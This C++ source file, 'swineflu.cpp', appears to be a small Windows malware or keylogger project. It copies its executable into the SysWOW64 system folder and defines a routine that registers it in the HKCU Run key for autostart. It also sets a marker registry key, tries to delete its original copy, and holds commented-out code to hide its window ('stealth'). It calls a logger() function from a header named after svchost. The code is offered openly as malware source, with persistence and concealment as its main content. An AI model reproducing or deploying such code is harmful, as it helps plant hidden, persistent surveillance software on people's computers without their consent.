// swineflu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string.h>


#include <sstream>
#include <string>

#include "Shlwapi.h"


#include <iostream>
#include "svchost.h"
#include <tchar.h>


using namespace std;

string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void addStartUpEntry()
{
	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
}

void firstTimeRunCheck()
{
	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");

	string swine_name = "swinef2";
	
	HKEY hKey = NULL;
	DWORD rtime;

	//Step 1: Open the key
	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef2", 0, KEY_READ, &hKey);

	//Step 2: If failed, create the key
	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
	{
		cout << "Creating registry key " << "swinef2" << endl;

		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef2", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
		
		RegSetValueEx(hKey,             // subkey handle 
			"BinxWhalton",        // value name 
			0,                         // must be zero 
			REG_EXPAND_SZ,             // value type 
			(LPBYTE)str.c_str(),          // pointer to value data 
			(DWORD)(lstrlen(str.c_str()) + 1)*sizeof(CHAR));

		if (ERROR_SUCCESS != j)
			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
		else
			cout << "Success: Key created" << endl;

		rtime = 0;

		printf("created reg key");

		

		int unlucksic = _unlink(
			str.c_str()
			);

		if (!unlucksic)
		{
			printf("did not work");
		}
	}
	else
	{
		printf("reg exists");
		string recData;
		RegGetValue(HKEY_CURRENT_USER, "swinef2", "BinxWhalton", RRF_RT_ANY, NULL, &recData, NULL);
		printf(recData.c_str());
	}
}



void adminstartup()
{
	HKEY hkey;
	DWORD dwDispoition;

	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");

	BOOL b = CopyFile(str.c_str(),
		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
	if (!b) {

		
		
		printf("%d\n", GetLastError());
	}
	else {
		printf("okay\n");
	}	
}


int _tmain(int argc, _TCHAR* argv[])
{
	//HWND stealth; /*creating stealth (window is not visible)*/
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	printf("wear your mask please\n");
	adminstartup();
	logger();

	// getchar();
	return 0;
}


